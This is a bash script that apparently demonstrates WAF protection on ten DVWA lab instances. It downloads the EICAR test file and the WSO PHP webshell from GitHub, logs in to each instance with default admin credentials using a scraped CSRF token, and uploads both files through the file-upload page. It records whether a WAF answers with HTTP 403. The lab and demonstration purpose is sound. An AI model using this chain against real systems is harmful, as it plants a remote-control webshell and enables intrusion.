#!/bin/bash

# Temp files
TMP_EICAR="eicar_com.zip"
TMP_WSO="wso.php"

# 1. Download once
echo "[*] 📥 Downloading EICAR test file..."
curl -fsSL -o "$TMP_EICAR" "https://secure.eicar.org/eicar_com.zip" && echo "✅ EICAR downloaded." || { echo "❌ Failed to download EICAR."; exit 1; }
echo ""

echo "[*] 📥 Downloading WSO webshell..."
curl -fsSL -o "$TMP_WSO" "https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/refs/heads/master/wso.php" && echo "✅ WSO downloaded." || { echo "❌ Failed to download WSO."; exit 1; }
echo ""

# Loop from dvwa1 to dvwa10
for i in {1..10}; do
    echo ""
    echo "==============================================="
    echo "🌐 Connecting to DVWA instance: dvwa$i.labsec.ca"
    echo "==============================================="
    
    DVWA_URL="https://dvwa${i}.labsec.ca"
    DVWA_HOST="dvwa${i}.labsec.ca"
    LOGIN_URL="${DVWA_URL}/login.php"
    UPLOAD_URL="${DVWA_URL}/vulnerabilities/upload/"
    COOKIE_FILE="cookie_dvwa${i}.txt"

    # Cleanup old cookie
    rm -f "$COOKIE_FILE"

    echo "[1] 🔐 Getting CSRF token from: $LOGIN_URL"
    TOKEN=$(curl -s -c "$COOKIE_FILE" "${LOGIN_URL}" | grep -oP "name='user_token' value='\K[^']+")
    if [ -z "$TOKEN" ]; then
        echo "❌ Failed to extract CSRF token."
        continue
    fi
    echo "✅ CSRF token: $TOKEN"
    echo ""

    echo "[2] 🔑 Logging in to $DVWA_HOST..."
    curl -sS "${LOGIN_URL}" \
        -H "authority: ${DVWA_HOST}" \
        -H "cache-control: max-age=0" \
        -H "content-type: application/x-www-form-urlencoded" \
        -H "origin: ${DVWA_URL}" \
        -H "referer: ${DVWA_URL}/" \
        -H "user-agent: File Security Demo Script" \
        --insecure \
        --data-raw "username=admin&password=password&Login=Login&user_token=${TOKEN}" \
        -b "$COOKIE_FILE" -c "$COOKIE_FILE" > /dev/null

    echo "[3] ✅ Verifying login..."
    if curl -s -b "$COOKIE_FILE" "$DVWA_URL/index.php" | grep -q "logout.php"; then
        echo "✅ Login successful."
    else
        echo "❌ Login failed for dvwa${i}."
        continue
    fi
    echo ""

    upload_file() {
        local FILE=$1
        echo "[4] 📤 Uploading $FILE to $UPLOAD_URL"
        HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
            -H "referer: ${UPLOAD_URL}" \
            -H "origin: ${DVWA_URL}" \
            -H "user-agent: File Security Demo Script" \
            -b "$COOKIE_FILE" \
            -F "uploaded=@$FILE" \
            -F "Upload=Upload" \
            "$UPLOAD_URL")

        echo "↪️ HTTP response code: $HTTP_CODE"
        if [ "$HTTP_CODE" == "200" ]; then
            echo "✅ Upload successful for $FILE"
        elif [ "$HTTP_CODE" == "403" ]; then
            echo "🛑 Upload failed for $FILE: blocked by WAF (HTTP 403)"
        else
            echo "⚠️ Upload failed for $FILE: HTTP $HTTP_CODE"
        fi
        echo ""
    }

    upload_file "$TMP_EICAR"
    upload_file "$TMP_WSO"

    echo "[5] 🧹 Cleaning up cookie: $COOKIE_FILE"
    rm -f "$COOKIE_FILE"
    echo "✅ Done with dvwa${i}."
    echo ""
done

# Final cleanup
echo "[*] Deleting downloaded files..."
rm -f "$TMP_EICAR" "$TMP_WSO"
echo "✅ Script completed."
